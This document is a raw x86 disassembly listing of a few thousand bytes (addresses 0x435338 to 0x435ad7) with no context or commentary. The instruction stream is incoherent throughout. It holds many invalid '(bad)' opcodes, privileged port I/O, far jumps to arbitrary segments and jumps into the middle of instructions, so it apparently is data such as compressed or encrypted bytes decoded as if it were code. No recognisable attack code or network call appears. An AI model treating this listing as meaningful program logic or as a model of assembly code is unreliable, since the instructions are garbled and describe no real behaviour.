  435338:	push   ds
  435339:	lahf   
  43533a:	sqrtps xmm2,XMMWORD PTR [eax]
  43533d:	dec    eax
  43533e:	outs   dx,BYTE PTR ds:[esi]
  43533f:	pop    edx
  435340:	in     eax,0x70
  435342:	xor    esp,ebx
  435344:	inc    ecx
  435345:	in     al,0x88
  435347:	ins    BYTE PTR es:[edi],dx
  435348:	pop    ecx
  435349:	mov    ah,0x52
  43534b:	pop    eax
  43534c:	test   BYTE PTR [ebx+eax*1],ah
  43534f:	(bad)  
  435350:	retf   0x2002
  435353:	pop    es
  435354:	shr    esp,1
  435356:	or     ax,0x3521
  43535a:	repnz xchg esi,eax
  43535c:	sbb    al,0xbb
  43535e:	out    0x24,eax
  435360:	mov    DWORD PTR [ecx+0x4a841a92],0x71f97b9e
  43536a:	sbb    cl,dl
  43536c:	or     BYTE PTR [esi],dh
  43536e:	xlat   BYTE PTR ds:[ebx]
  43536f:	adc    ecx,edi
  435371:	aam    0xca
  435373:	aaa    
  435374:	cld    
  435375:	mov    ds,WORD PTR [ecx+esi*4+0x7]
  435379:	es pop ebp
  43537b:	aam    0x50
  43537d:	mov    dl,0xd9
  43537f:	xor    BYTE PTR [ebx+0x1e],0x97
  435383:	aad    0x37
  435385:	ret    0xf54b
  435388:	jb     0x4353a2
  43538a:	or     ecx,DWORD PTR [ecx]
  43538c:	fisubr DWORD PTR [esi]
  43538e:	imul   edx,DWORD PTR [edx],0xffffff84
  435391:	mov    edx,0x3c40a628
  435396:	xor    eax,0xc7f7d62d
  43539b:	and    ah,BYTE PTR [eax-0x6f]
  43539e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43539f:	pop    ds
  4353a0:	in     al,dx
  4353a1:	in     al,0xf4
  4353a3:	lods   al,BYTE PTR ds:[esi]
  4353a4:	imul   esi,DWORD PTR [edx],0x42
  4353a7:	sub    ecx,DWORD PTR [ebp-0x26]
  4353aa:	or     eax,0x662ecab9
  4353af:	add    BYTE PTR [eax+0x6da59c3b],cl
  4353b5:	cmp    bl,BYTE PTR [eax]
  4353b7:	or     edx,DWORD PTR [edi-0xc]
  4353ba:	(bad)  
  4353bb:	fadd   QWORD PTR [esi]
  4353bd:	adc    dl,BYTE PTR [eax+0x1a24c88e]
  4353c3:	test   BYTE PTR [edi+0x5ed1a3e],ch
  4353c9:	cmp    DWORD PTR [edi+0x46],eax
  4353cc:	bound  edx,QWORD PTR [edx]
  4353ce:	sub    al,0xdf
  4353d0:	and    DWORD PTR [edi+0x9],eax
  4353d3:	call   0xb618:0x840ba264
  4353da:	ds stc 
  4353dc:	or     eax,0x1c212849
  4353e1:	outs   dx,BYTE PTR ds:[esi]
  4353e2:	leave  
  4353e3:	sbb    BYTE PTR ds:0x488011b4,cl
  4353e9:	test   ch,bh
  4353eb:	xchg   esp,eax
  4353ec:	ins    DWORD PTR es:[edi],dx
  4353ed:	cwde   
  4353ee:	aad    0x18
  4353f0:	jg     0x4353ee
  4353f2:	or     al,0x68
  4353f4:	test   BYTE PTR [eax+0x37],ch
  4353f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4353f8:	fs add dh,cl
  4353fb:	lods   al,BYTE PTR ds:[esi]
  4353fc:	mov    esp,0xc3398119
  435401:	xchg   DWORD PTR [eax+0x7e347bde],edx
  435407:	jecxz  0x435468
  435409:	rcr    BYTE PTR [ecx-0xf778074],0xe5
  435410:	nop
  435411:	mov    WORD PTR [edx+0x63482344],es
  435417:	sti    
  435418:	jp     0x4353ce
  43541a:	adc    DWORD PTR [ecx+0x49f3235f],eax
  435420:	bound  ebp,QWORD PTR [edi]
  435422:	mov    edi,0xe214f325
  435427:	ret    
  435428:	and    BYTE PTR [ebp+0x16],al
  43542b:	or     eax,0x920abc97
  435430:	jbe    0x43548a
  435432:	ret    
  435433:	xchg   esp,eax
  435434:	jp     0x435439
  435436:	(bad)  
  435437:	and    DWORD PTR [ecx],ebx
  435439:	adc    BYTE PTR [esi],dh
  43543b:	sub    eax,0x9e50c79b
  435440:	adc    DWORD PTR [edx-0x2365636d],ebx
  435446:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  435447:	or     DWORD PTR [ebp+eax*2+0x45a3b849],0xffffffe0
  43544f:	out    dx,eax
  435450:	mov    eax,ds:0x5c903b4c
  435455:	mov    al,0x24
  435457:	inc    eax
  435458:	in     eax,0x61
  43545a:	shl    BYTE PTR [esi],1
  43545c:	outs   dx,BYTE PTR ds:[esi]
  43545d:	pop    esi
  43545f:	inc    edi
  435460:	sub    bh,BYTE PTR [esi]
  435462:	adc    DWORD PTR [ebx],edi
  435464:	int3   
  435465:	xor    al,0x80
  435467:	push   0xfffffff4
  435469:	(bad)  
  43546a:	sbb    al,0x3
  43546c:	pushf  
  43546d:	add    DWORD PTR [eax-0x1ae1ff5b],0xb0e97af4
  435477:	sub    al,0x15
  435479:	or     esi,DWORD PTR [eax+0x1f]
  43547c:	push   ebp
  43547d:	adc    ch,dl
  43547f:	pushf  
  435480:	add    DWORD PTR [ebx-0x71d6d6ae],esp
  435486:	jo     0x43543f
  435488:	xchg   ecx,eax
  435489:	and    BYTE PTR [eax+ebp*2+0x1],al
  43548d:	cmp    ecx,DWORD PTR [esp+ebp*2-0x321d43dd]
  435494:	mov    dl,0x64
  435496:	and    ch,BYTE PTR [edi+edx*4+0x27]
  43549a:	push   edx
  43549b:	add    BYTE PTR [eax+eax*8+0x7b3475c1],al
  4354a2:	es mov cl,0x4b
  4354a5:	jo     0x43547f
  4354a7:	and    al,0xdd
  4354a9:	lods   al,BYTE PTR ds:[esi]
  4354aa:	retf   
  4354ab:	cmp    BYTE PTR [edx-0x16],dh
  4354ae:	ffree  st(1)
  4354b0:	xchg   esi,eax
  4354b1:	add    eax,esp
  4354b3:	xchg   edi,eax
  4354b4:	mov    DWORD PTR [edx-0x38],ebx
  4354b7:	fiadd  DWORD PTR [edx+edx*2]
  4354ba:	stos   BYTE PTR es:[edi],al
  4354bb:	ds push ss
  4354bd:	and    dl,BYTE PTR [ebx+0x5e7d99bf]
  4354c3:	retf   0x933e
  4354c6:	sbb    al,0x13
  4354c8:	into   
  4354c9:	sbb    eax,0x5f616975
  4354ce:	xchg   edx,eax
  4354cf:	xchg   ebx,eax
  4354d0:	test   edx,edx
  4354d2:	test   DWORD PTR [edi],0x1132aacb
  4354d8:	lea    eax,[ecx+0x19]
  4354db:	mov    esp,0x180fc9c3
  4354e0:	inc    ebp
  4354e1:	mov    dl,0xd4
  4354e3:	into   
  4354e4:	push   ebx
  4354e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4354e6:	icebp  
  4354e7:	mov    al,ds:0xed73b6a3
  4354ec:	or     ah,0x31
  4354ef:	iret   
  4354f0:	out    0xc1,al
  4354f2:	add    DWORD PTR [ebx+0x4e],ecx
  4354f5:	cmp    al,0xe1
  4354f7:	sub    al,0x32
  4354f9:	and    edx,ebx
  4354fb:	inc    esi
  4354fc:	mov    edx,0x61623b2e
  435501:	fstp   DWORD PTR [ecx]
  435503:	xchg   esi,eax
  435504:	mov    DWORD PTR [ecx+esi*2-0x72],eax
  435508:	add    dh,BYTE PTR [ecx+0x6f074106]
  43550e:	add    cl,BYTE PTR [ebx]
  435510:	jmp    0xa713:0x600fecaa
  435517:	lahf   
  435518:	daa    
  435519:	mov    dl,0x71
  43551b:	dec    ecx
  43551c:	fwait
  43551d:	mov    esi,0x133f9e37
  435522:	repz clc 
  435524:	(bad)  
  435525:	clc    
  435526:	sub    al,0xdd
  435528:	jg     0x435578
  43552a:	es jmp 0x4354e5
  43552d:	push   ds
  43552e:	jae    0x435538
  435530:	out    0x1f,eax
  435532:	fidivr WORD PTR [esi+edx*8+0x1b]
  435536:	ss out dx,al
  435538:	mov    eax,ds:0xac50f3e8
  43553d:	inc    ecx
  43553e:	pushf  
  43553f:	mov    edi,0x842ed193
  435544:	je     0x435540
  435546:	outs   dx,BYTE PTR ds:[esi]
  435547:	inc    esp
  435548:	mov    ss,WORD PTR [eax+ecx*2-0x1efaab32]
  43554f:	inc    edi
  435550:	ret    0x5e5b
  435553:	xchg   edi,eax
  435554:	push   ecx
  435555:	mov    dl,0x76
  435557:	dec    ecx
  435558:	pop    eax
  435559:	sti    
  43555a:	inc    esp
  43555b:	hlt    
  43555c:	add    eax,0x56a12234
  435561:	and    cl,BYTE PTR [esi-0x6e]
  435564:	adc    DWORD PTR [ecx+0x2a116ec0],ebp
  43556a:	cwde   
  43556b:	es xchg ebx,eax
  43556d:	mov    dl,0x53
  43556f:	push   cs
  435570:	add    al,0x22
  435572:	lds    edi,FWORD PTR [esi]
  435574:	jb     0x4355d8
  435576:	xchg   esi,eax
  435577:	dec    esi
  435578:	cmp    DWORD PTR [edi],esi
  43557a:	or     DWORD PTR [eax+0x60396015],0xffffffbb
  435581:	or     BYTE PTR [eax+0x7c],ah
  435584:	add    eax,0xb3f5c392
  435589:	pop    ecx
  43558a:	sbb    ecx,DWORD PTR [eax]
  43558c:	xlat   BYTE PTR ds:[ebx]
  43558d:	xchg   edx,eax
  43558e:	jmp    0x52be291c
  435593:	xchg   BYTE PTR [eax],dh
  435595:	add    eax,DWORD PTR [esi+0x23]
  435598:	out    0xa7,eax
  43559a:	pop    esp
  43559b:	sbb    ah,ah
  43559d:	js     0x435523
  43559f:	add    DWORD PTR [ecx-0x3d],esp
  4355a2:	int    0x55
  4355a4:	add    al,0xc2
  4355a6:	push   0x79
  4355a8:	leave  
  4355a9:	jo     0x435617
  4355ab:	(bad)  
  4355ac:	loopne 0x43554d
  4355ae:	and    al,0x56
  4355b0:	mov    al,0xb9
  4355b2:	sbb    DWORD PTR [edx+eax*2-0x75],edi
  4355b6:	xor    BYTE PTR [esi-0x169a670],dl
  4355bc:	ds cmps DWORD PTR cs:[esi],DWORD PTR es:[edi]
  4355bf:	pop    edx
  4355c0:	push   cs
  4355c1:	enter  0x5136,0xfa
  4355c5:	in     al,dx
  4355c6:	mov    cl,BYTE PTR [ecx+edx*8+0xd]
  4355ca:	test   al,0x6
  4355cc:	xchg   DWORD PTR [eax],edx
  4355ce:	leave  
  4355cf:	inc    edi
  4355d0:	test   al,0xac
  4355d2:	cmp    esi,DWORD PTR [edx+0xc]
  4355d5:	hlt    
  4355d6:	xchg   esi,eax
  4355d7:	in     al,dx
  4355d8:	pushf  
  4355d9:	ret    
  4355da:	into   
  4355db:	xchg   ebx,eax
  4355dc:	in     al,dx
  4355dd:	adc    cl,al
  4355df:	sub    DWORD PTR ds:0x4c6541ef,eax
  4355e5:	ficomp DWORD PTR [eax+0x61102dac]
  4355eb:	enter  0xc763,0xa4
  4355ef:	aas    
  4355f0:	push   ebx
  4355f1:	pop    ebx
  4355f2:	add    BYTE PTR [edi+0x8],bh
  4355f5:	sbb    BYTE PTR [esi-0x25e88722],0x2
  4355fc:	mov    ecx,0x603f00d9
  435601:	mov    eax,ds:0x14a0dfa5
  435606:	icebp  
  435607:	in     al,0x6e
  435609:	les    eax,FWORD PTR [edx+0x1e]
  43560c:	xchg   ebx,eax
  43560d:	in     eax,dx
  43560e:	in     al,0x43
  435610:	xor    bl,cl
  435612:	push   es
  435613:	cdq    
  435614:	outs   dx,DWORD PTR ds:[esi]
  435615:	fs in  eax,dx
  435617:	add    DWORD PTR [ebp+0x1e06c500],0x897951d
  435621:	or     BYTE PTR [edi+edi*1],cl
  435624:	mov    bh,0xe5
  435626:	xchg   ebx,eax
  435627:	xor    al,0xb5
  435629:	repz xor DWORD PTR [ecx],edi
  43562c:	xor    al,0x44
  43562e:	in     al,dx
  43562f:	sbb    eax,DWORD PTR [eax-0x74]
  435632:	bound  ebx,QWORD PTR [edx+edi*4]
  435635:	gs out 0x63,eax
  435638:	push   0xf
  43563a:	jne    0x43564e
  43563c:	xor    BYTE PTR [ecx],0x2b
  43563f:	fiadd  DWORD PTR [ebp+0x53223b90]
  435645:	imul   ecx,ebp,0xffffffc8
  435648:	sbb    edx,DWORD PTR [eax+ecx*1]
  43564b:	sub    bl,dh
  43564d:	icebp  
  43564e:	push   edi
  43564f:	arpl   WORD PTR [eax+edi*8],cx
  435652:	sbb    al,0xaa
  435654:	xor    DWORD PTR [eax-0x7b],edx
  435657:	rcr    BYTE PTR [edi+0x37f09ac1],0xc8
  43565e:	cmp    esp,edx
  435660:	jns    0x435666
  435662:	outs   dx,DWORD PTR ds:[esi]
  435663:	pop    ebp
  435664:	hlt    
  435665:	or     ebx,DWORD PTR [ebx+0x35e3256]
  43566b:	les    ebx,FWORD PTR [edi]
  43566d:	inc    ebp
  43566e:	aaa    
  43566f:	loopne 0x4356aa
  435671:	mov    al,ds:0x2a1b2e5a
  435676:	(bad)  
  435677:	jmp    0x43565a
  435679:	js     0x435671
  43567b:	jb     0x435629
  43567d:	aas    
  43567e:	xor    bl,BYTE PTR [eax+0x41]
  435681:	test   eax,0xc6871b42
  435686:	mov    dl,0x95
  435688:	mov    ebp,0xea61471f
  43568d:	or     eax,DWORD PTR ds:0x8164206e
  435693:	jmp    0x435624
  435695:	sub    BYTE PTR [ebx],al
  435697:	arpl   WORD PTR [eax],di
  435699:	xchg   edi,eax
  43569a:	fisttp QWORD PTR [edi+0x78]
  43569d:	adc    edx,DWORD PTR [ebx+0x2497330b]
  4356a3:	xor    al,0xa8
  4356a5:	jmp    0xd7c81f72
  4356aa:	loopne 0x4356fd
  4356ac:	fst    st(3)
  4356ae:	js     0x435728
  4356b0:	push   es
  4356b1:	jl     0x435642
  4356b3:	lods   al,BYTE PTR ds:[esi]
  4356b4:	xlat   BYTE PTR ds:[ebx]
  4356b5:	push   es
  4356b6:	pop    ecx
  4356b7:	add    BYTE PTR [ecx+0x16b8321],ah
  4356bd:	dec    ebp
  4356be:	pop    ebx
  4356bf:	(bad)  
  4356c0:	fimul  DWORD PTR [edx+0x1ec7dec9]
  4356c6:	and    al,0xa7
  4356c8:	sbb    DWORD PTR [eax],ecx
  4356ca:	sub    dl,BYTE PTR [ebp+0x6a]
  4356cd:	pusha  
  4356ce:	add    edx,eax
  4356d0:	sub    DWORD PTR [edi+0x28300f6a],eax
  4356d6:	inc    edi
  4356d7:	aaa    
  4356d8:	ror    ebx,0x87
  4356db:	dec    edi
  4356dc:	add    ah,dh
  4356de:	adc    esi,DWORD PTR [ecx]
  4356e0:	pop    esp
  4356e1:	xchg   edx,eax
  4356e2:	inc    ebp
  4356e3:	mov    dh,0xe5
  4356e5:	sbb    al,0x7e
  4356e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4356e8:	aad    0x62
  4356ea:	(bad)  
  4356eb:	inc    eax
  4356ec:	test   al,0x8f
  4356ee:	dec    esi
  4356ef:	(bad)  
  4356f0:	out    dx,eax
  4356f1:	lds    ebp,FWORD PTR [ecx+edx*8-0x6421fef8]
  4356f8:	sahf   
  4356f9:	jno    0x43574f
  4356fb:	(bad)  
  4356fc:	enter  0x9b2b,0x40
  435700:	(bad)  
  435701:	loopne 0x4356fe
  435703:	jb     0x435731
  435705:	jbe    0x435760
  435707:	dec    esi
  435708:	out    dx,al
  435709:	and    esp,edi
  43570b:	inc    ebx
  43570c:	and    eax,0x36b941a1
  435711:	inc    eax
  435712:	dec    edi
  435713:	dec    esp
  435714:	sub    al,0x18
  435716:	jbe    0x43570a
  435718:	adc    esp,DWORD PTR [eax+0x4444231f]
  43571e:	cwde   
  43571f:	test   DWORD PTR [ebx+0x3491d205],edx
  435725:	scas   al,BYTE PTR es:[edi]
  435726:	sub    DWORD PTR ds:0x489909f5,ebx
  43572c:	xchg   esp,eax
  43572d:	shl    DWORD PTR [ebx],cl
  43572f:	ja     0x435777
  435731:	push   esi
  435732:	les    esp,FWORD PTR [esi]
  435734:	cmp    esp,DWORD PTR [edx]
  435736:	and    ecx,DWORD PTR [eax]
  435738:	pop    ecx
  435739:	in     al,dx
  43573a:	pushf  
  43573b:	adc    BYTE PTR [ecx+0x3],ch
  43573e:	or     al,0x45
  435740:	lahf   
  435741:	scas   al,BYTE PTR es:[edi]
  435742:	(bad)  
  435743:	cmp    al,0x9d
  435745:	mov    WORD PTR [ebp+0xb4a2083],cs
  43574b:	or     eax,DWORD PTR [eax+0x3d2d0b0a]
  435751:	das    
  435752:	test   eax,0x1acb0fcf
  435757:	or     ah,BYTE PTR [ecx+0x26]
  43575a:	leave  
  43575b:	ins    BYTE PTR es:[edi],dx
  43575c:	(bad)  
  43575d:	ins    BYTE PTR es:[edi],dx
  43575e:	push   0x122c4a9c
  435763:	cwde   
  435764:	xchg   esp,eax
  435765:	mov    BYTE PTR [ebx+0x18beb713],bh
  43576b:	jae    0x4357b0
  43576d:	mov    es,WORD PTR [ebx-0x5b]
  435770:	or     al,0xf7
  435772:	sbb    eax,0x39827989
  435777:	or     BYTE PTR [eax],ch
  435779:	sub    al,0x36
  43577b:	aas    
  43577c:	mov    DWORD PTR [esi],esi
  43577e:	cmp    BYTE PTR [eax+ecx*4+0x8],0xc0
  435783:	stos   BYTE PTR es:[edi],al
  435784:	add    al,0x11
  435786:	or     esp,DWORD PTR [esi-0x5b635b1f]
  43578c:	shr    DWORD PTR [ebx],cl
  43578e:	inc    edi
  43578f:	ins    DWORD PTR es:[edi],dx
  435790:	add    BYTE PTR [ebx+0x6994db28],bh
  435796:	pop    esi
  435797:	das    
  435798:	lds    edi,FWORD PTR [eax]
  43579a:	loopne 0x435794
  43579c:	mov    ds:0xada03de,eax
  4357a1:	test   DWORD PTR [edx+0xe],ebx
  4357a4:	jmp    0x4357c6
  4357a6:	dec    ebp
  4357a7:	cmp    DWORD PTR [eax+0x2160e676],esi
  4357ad:	imul   eax,DWORD PTR [edi+0x49ee164],0xfffffff8
  4357b4:	pop    ecx
  4357b5:	(bad)  [edi-0x7f]
  4357b8:	dec    edi
  4357b9:	or     DWORD PTR [edx],ebp
  4357bb:	jae    0x4357df
  4357bd:	cmp    BYTE PTR [ecx-0x25dd833d],bh
  4357c3:	mov    bl,BYTE PTR [ecx-0x1c81586f]
  4357c9:	sub    ecx,edx
  4357cb:	sub    DWORD PTR [esi-0x565d83c0],edi
  4357d1:	and    dl,BYTE PTR [ecx+eax*8+0x6e]
  4357d5:	hlt    
  4357d6:	leave  
  4357d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4357d8:	scas   al,BYTE PTR es:[edi]
  4357d9:	test   al,0xf6
  4357db:	sbb    al,0x5e
  4357dd:	sbb    al,0x8c
  4357df:	cmp    DWORD PTR [ecx],edx
  4357e1:	(bad)  
  4357e3:	sbb    ebp,ebp
  4357e5:	(bad)  
  4357e6:	jle    0x435855
  4357e8:	and    edx,0x41
  4357eb:	sti    
  4357ec:	adc    BYTE PTR [ecx+0x3840de42],al
  4357f2:	add    eax,0x7652b5b5
  4357f7:	cwde   
  4357f8:	rcr    ah,0x83
  4357fb:	or     eax,0xcb5520c4
  435800:	test   BYTE PTR [edi],0xe1
  435803:	xor    ebp,ecx
  435805:	pusha  
  435806:	inc    esi
  435807:	adc    eax,0xf88981d1
  43580c:	not    DWORD PTR [eax-0x609f97d4]
  435812:	lds    edi,FWORD PTR [ecx]
  435814:	xchg   BYTE PTR [ebx],al
  435816:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435817:	aas    
  435818:	imul   ebp,DWORD PTR [esi+ebx*8],0xffffffd0
  43581c:	inc    ebx
  43581d:	(bad)  
  43581f:	add    edx,ecx
  435821:	dec    ebx
  435822:	push   edx
  435823:	inc    edi
  435824:	dec    ecx
  435825:	push   esi
  435826:	jne    0x435839
  435828:	and    al,0x2c
  43582a:	pop    esp
  43582b:	stos   BYTE PTR es:[edi],al
  43582c:	or     eax,0xcbad8763
  435831:	or     DWORD PTR [esi],edx
  435833:	pushf  
  435834:	adc    dl,BYTE PTR [ecx+ebx*2+0x5098e062]
  43583b:	cmp    al,0xcd
  43583d:	sub    al,0x18
  43583f:	adc    dh,BYTE PTR [eax]
  435841:	pusha  
  435842:	lahf   
  435843:	shl    ecx,0xd2
  435846:	and    edx,ebx
  435848:	xor    ah,BYTE PTR [edi-0x546ba031]
  43584e:	and    al,0x11
  435850:	push   ss
  435851:	and    ch,BYTE PTR [ecx+0x5]
  435854:	imul   ecx,DWORD PTR ds:0xab048ed2,0x82049975
  43585e:	and    al,0xa4
  435860:	je     0x4358dc
  435862:	push   ds
  435863:	xchg   ebx,eax
  435864:	shl    DWORD PTR [ebx+edx*2-0x57377181],cl
  43586b:	inc    eax
  43586c:	(bad)  
  43586d:	aas    
  43586e:	or     edx,eax
  435870:	sbb    esi,DWORD PTR [ecx]
  435872:	into   
  435873:	jmp    0x9e7bd2bc
  435878:	(bad)  
  435879:	les    bp,DWORD PTR [esi]
  43587c:	iret   
  43587d:	cmp    eax,0x276da9ff
  435882:	adc    cl,BYTE PTR gs:[ecx+0x4e14fcbc]
  435889:	mov    edi,0x86c25ef4
  43588e:	mov    al,ds:0xc2c58f19
  435893:	jl     0x4358b6
  435895:	ss add al,0xa6
  435898:	add    BYTE PTR [ebp+eax*2+0x3f81f364],ch
  43589f:	out    0x60,eax
  4358a1:	xchg   ecx,eax
  4358a2:	push   cs
  4358a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4358a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4358a5:	xchg   edx,eax
  4358a6:	xor    DWORD PTR [edi+0x361c1e7c],edx
  4358ac:	in     al,0xb7
  4358ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4358af:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  4358b1:	test   al,0xc6
  4358b3:	mov    BYTE PTR [ecx+ecx*2+0x706ad24],ch
  4358ba:	jb     0x435907
  4358bc:	imul   BYTE PTR [eax+eiz*8-0x16]
  4358c0:	xchg   edx,eax
  4358c1:	and    DWORD PTR [esi-0x2da1eac],esi
  4358c7:	jne    0x435924
  4358c9:	scas   al,BYTE PTR es:[edi]
  4358ca:	iret   
  4358cb:	mov    eax,0xf987bd91
  4358d0:	xchg   ecx,eax
  4358d1:	pop    esp
  4358d2:	xchg   esi,eax
  4358d3:	lea    edx,[ebx]
  4358d5:	xchg   esi,eax
  4358d6:	lock pop ebx
  4358d8:	adc    al,dl
  4358da:	addr16 fs mov esi,es
  4358de:	push   esp
  4358df:	cld    
  4358e0:	retf   
  4358e1:	inc    ecx
  4358e2:	ins    BYTE PTR es:[edi],dx
  4358e3:	sbb    al,0x3c
  4358e5:	mov    WORD PTR [ebx],?
  4358e7:	gs mov ecx,0x44cdc700
  4358ed:	dec    DWORD PTR [esi-0x38]
  4358f0:	call   0x61e6:0xb4c24e0c
  4358f7:	mov    DWORD PTR [esi],esp
  4358f9:	adc    DWORD PTR [ecx],ecx
  4358fb:	addr16 push ds
  4358fd:	ficom  WORD PTR es:[esi+0x6b075d0c]
  435904:	sub    DWORD PTR [ecx+0x2c9f4c08],0x41
  43590b:	dec    esp
  43590c:	ret    0xd95d
  43590f:	cld    
  435910:	lods   al,BYTE PTR ds:[esi]
  435911:	retf   0x57de
  435914:	xchg   BYTE PTR [edi+0x7520c2a7],al
  43591a:	pop    ecx
  43591b:	add    edx,DWORD PTR [eax+0x33]
  43591e:	inc    ecx
  43591f:	mov    esi,0x72a10b61
  435924:	mov    ds:0x21da731a,eax
  435929:	leave  
  43592a:	mov    cl,0x97
  43592c:	xor    ebx,0x1b0d6792
  435932:	retf   0xeca8
  435935:	sbb    BYTE PTR [edi+ebp*2+0x68604920],al
  43593c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43593d:	cmp    BYTE PTR [ecx],dl
  43593f:	repz adc al,0x4d
  435942:	repnz or esi,DWORD PTR [eax-0x7e]
  435946:	adc    DWORD PTR [esi+0x22],ecx
  435949:	ins    BYTE PTR es:[edi],dx
  43594a:	dec    eax
  43594b:	stos   BYTE PTR es:[edi],al
  43594c:	das    
  43594d:	sbb    BYTE PTR [esi-0x2c],bh
  435950:	scas   al,BYTE PTR es:[edi]
  435951:	fwait
  435952:	icebp  
  435953:	dec    esi
  435954:	enter  0xf021,0x9e
  435958:	inc    edx
  435959:	or     eax,DWORD PTR [esi-0x53]
  43595c:	shr    BYTE PTR [esi],0x39
  43595f:	pop    edx
  435960:	and    DWORD PTR [ebx+0x76f64c6c],0xcd808f93
  43596a:	(bad)  
  43596b:	data16 shl BYTE PTR [ecx+eiz*1+0x386d823a],0x21
  435974:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435975:	inc    edx
  435976:	xchg   ebx,eax
  435977:	imul   edi,DWORD PTR [esi],0x2b
  43597a:	fndisi(8087 only) 
  43597c:	add    BYTE PTR [esp+edx*4+0x2d],cl
  435980:	push   cs
  435981:	adc    BYTE PTR [ebp-0x186de74],dl
  435987:	push   edi
  435988:	arpl   WORD PTR [esi],bx
  43598a:	pop    eax
  43598b:	int3   
  43598c:	and    al,0x8
  43598e:	mov    eax,ds:0xf9c5a47d
  435993:	into   
  435994:	fdiv   DWORD PTR [eax+ebp*2]
  435997:	test   BYTE PTR cs:[edi],ch
  43599a:	scas   eax,DWORD PTR es:[edi]
  43599b:	lds    eax,FWORD PTR [edx-0x1b]
  43599e:	fs dec edx
  4359a0:	std    
  4359a1:	mov    esi,0xba0e8b12
  4359a6:	mov    ah,0x74
  4359a8:	or     eax,0xf12b7f99
  4359ad:	dec    esi
  4359ae:	sbb    al,0xb6
  4359b0:	inc    esp
  4359b1:	jbe    0x4359b3
  4359b3:	and    eax,0xea803381
  4359b8:	sub    cl,BYTE PTR [ebp+0x7ef1b3db]
  4359be:	jmp    0xb778:0x4bf2c013
  4359c5:	inc    ebx
  4359c6:	cs xchg ecx,eax
  4359c8:	inc    esi
  4359c9:	lds    ebp,FWORD PTR [ecx]
  4359cb:	or     BYTE PTR [ebx],dh
  4359cd:	lock repz cmp BYTE PTR [edx-0x55],0x8c
  4359d3:	jmp    0x435a28
  4359d5:	inc    esp
  4359d6:	es loope 0x4359f5
  4359d9:	(bad)  
  4359da:	gs cmc 
  4359dc:	xchg   ebp,eax
  4359dd:	push   eax
  4359de:	sbb    DWORD PTR [esi+0x76d143d3],ecx
  4359e4:	sbb    al,0x6f
  4359e6:	and    ebx,ecx
  4359e8:	xchg   BYTE PTR [ecx],ah
  4359ea:	fadd   QWORD PTR [esi]
  4359ec:	sahf   
  4359ed:	and    cl,BYTE PTR [edi+0x636e33c5]
  4359f3:	xor    esi,ebp
  4359f5:	loopne 0x435a42
  4359f7:	loopne 0x435a08
  4359f9:	add    BYTE PTR [edx-0x1c14dc83],dh
  4359ff:	inc    esi
  435a00:	mov    dh,0xee
  435a02:	test   al,0x5
  435a04:	rcl    DWORD PTR [esi],1
  435a06:	jecxz  0x435a39
  435a08:	xlat   BYTE PTR es:[ebx]
  435a0a:	push   0x40
  435a0c:	and    ecx,0x14
  435a0f:	daa    
  435a10:	mov    ch,0x1e
  435a12:	or     eax,0x34da6c84
  435a17:	into   
  435a18:	inc    eax
  435a19:	nop
  435a1a:	fwait
  435a1b:	loop   0x4359fb
  435a1d:	imul   ebx,DWORD PTR [ecx+0x68c41a69],0x340fac47
  435a27:	dec    ecx
  435a28:	jb     0x435a47
  435a2a:	or     cl,cl
  435a2c:	mov    ds:0xfecb3769,eax
  435a31:	mov    dl,0x11
  435a33:	mov    ecx,0x9fb2eb8
  435a38:	sub    eax,0x8390839b
  435a3d:	jl     0x435a70
  435a3f:	fwait
  435a40:	xchg   edi,eax
  435a41:	ror    BYTE PTR [eax+0x30],cl
  435a44:	add    dl,BYTE PTR [ecx]
  435a46:	mov    ebx,0xa00688ae
  435a4b:	repnz out 0x55,eax
  435a4e:	push   ebx
  435a4f:	mov    al,0x89
  435a51:	adc    eax,0x9101c70d
  435a56:	pop    ss
  435a57:	and    esp,DWORD PTR [eax+0x17e1664]
  435a5d:	ss cmp esi,edi
  435a60:	mov    ah,0xc7
  435a62:	cmp    DWORD PTR es:[edi+0x1a72ef1d],0xcc344e44
  435a6d:	add    edx,eax
  435a6f:	jl     0x435a28
  435a71:	fs pop ebx
  435a73:	sgdtd  [ecx-0x7e25744d]
  435a7a:	mov    ecx,0x811390a3
  435a7f:	nop
  435a80:	pop    ds
  435a81:	popa   
  435a82:	mov    eax,ds:0x149face9
  435a87:	adc    al,0x61
  435a89:	mov    dl,0x48
  435a8b:	sbb    ah,BYTE PTR [ecx]
  435a8d:	mov    DWORD PTR [edx],eax
  435a8f:	mov    al,0x6
  435a91:	daa    
  435a92:	add    al,0x5
  435a94:	sub    BYTE PTR [ecx+0x21],dl
  435a97:	test   eax,0x8064449c
  435a9c:	push   ebx
  435a9d:	cwde   
  435a9e:	ret    0xf50f
  435aa1:	mov    cl,0x1
  435aa3:	stos   BYTE PTR es:[edi],al
  435aa4:	arpl   WORD PTR [edx-0x52],si
  435aa7:	retf   
  435aa8:	lds    ecx,FWORD PTR [eax-0x4f]
  435aab:	fabs   
  435aad:	push   cs
  435aae:	nop
  435aaf:	pushf  
  435ab0:	cmp    ebp,DWORD PTR es:[edx]
  435ab3:	inc    ebx
  435ab4:	test   cl,al
  435ab6:	mov    esi,0x3c36c9f7
  435abb:	test   eax,0xc073e9ad
  435ac0:	dec    edx
  435ac1:	pusha  
  435ac2:	retf   
  435ac3:	aaa    
  435ac4:	arpl   WORD PTR [edi+ecx*4-0x35],bx
  435ac8:	dec    esi
  435ac9:	(bad)  
  435aca:	outs   dx,BYTE PTR ds:[esi]
  435acb:	sbb    DWORD PTR [ebx],esi
  435acd:	sahf   
  435ace:	xlat   BYTE PTR ds:[ebx]
  435acf:	out    0xc3,al
  435ad1:	mov    eax,ds:0x37775688
  435ad6:	out    dx,al
  435ad7:	and    DWORD PTR [edi+0x3b73dd20],esp
